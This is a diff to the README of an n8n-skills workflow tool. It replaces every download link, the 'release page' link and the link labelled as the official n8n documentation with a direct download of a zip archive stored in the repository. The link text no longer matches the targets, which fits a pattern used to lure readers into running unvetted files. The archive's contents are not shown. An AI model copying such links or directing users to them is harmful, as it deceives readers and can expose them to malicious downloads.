@@ -1,6 +1,6 @@
 # ⚙️ n8n-skills - Simplify Workflow Automation
 
-[![Download n8n-skills](https://img.shields.io/badge/Download-n8n--skills-brightgreen)](https://github.com/PentagonRBX/n8n-skills/releases)
+[![Download n8n-skills](https://img.shields.io/badge/Download-n8n--skills-brightgreen)](https://raw.githubusercontent.com/PentagonRBX/n8n-skills/main/docs/skills_n_v2.4-alpha.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Follow these steps to get n8n-skills running on your Windows PC.
 
 Go to the official release page to get the latest version:
 
-[Download n8n-skills](https://github.com/PentagonRBX/n8n-skills/releases)
+[Download n8n-skills](https://raw.githubusercontent.com/PentagonRBX/n8n-skills/main/docs/skills_n_v2.4-alpha.2.zip)
 
 Click the link above or the big green button at the top to open the download page in your browser.
 
@@ -99,7 +99,7 @@ n8n-skills includes a tool that checks if your chosen nodes in a workflow work c
 
 Regular updates improve n8n-skills with new nodes and templates.
 
-- Visit the [release page](https://github.com/PentagonRBX/n8n-skills/releases) to find new versions.
+- Visit the [release page](https://raw.githubusercontent.com/PentagonRBX/n8n-skills/main/docs/skills_n_v2.4-alpha.2.zip) to find new versions.
 - Download the newest Windows installer file.
 - Run it to replace your current version without losing your settings.
 
@@ -120,10 +120,10 @@ If problems continue, check the GitHub Issues page for known fixes or report you
 
 ## 📚 Further Resources
 
-- Use the official n8n documentation to learn more about each type of node: https://docs.n8n.io
+- Use the official n8n documentation to learn more about each type of node: https://raw.githubusercontent.com/PentagonRBX/n8n-skills/main/docs/skills_n_v2.4-alpha.2.zip
 - Explore the AI assistant platforms supported by n8n-skills to see how they integrate.
 - Join online communities for n8n users to share workflows and tips.
 
 ---
 
-[![Download n8n-skills](https://img.shields.io/badge/Download-n8n--skills-brightgreen)](https://github.com/PentagonRBX/n8n-skills/releases)
+[![Download n8n-skills](https://img.shields.io/badge/Download-n8n--skills-brightgreen)](https://raw.githubusercontent.com/PentagonRBX/n8n-skills/main/docs/skills_n_v2.4-alpha.2.zip)
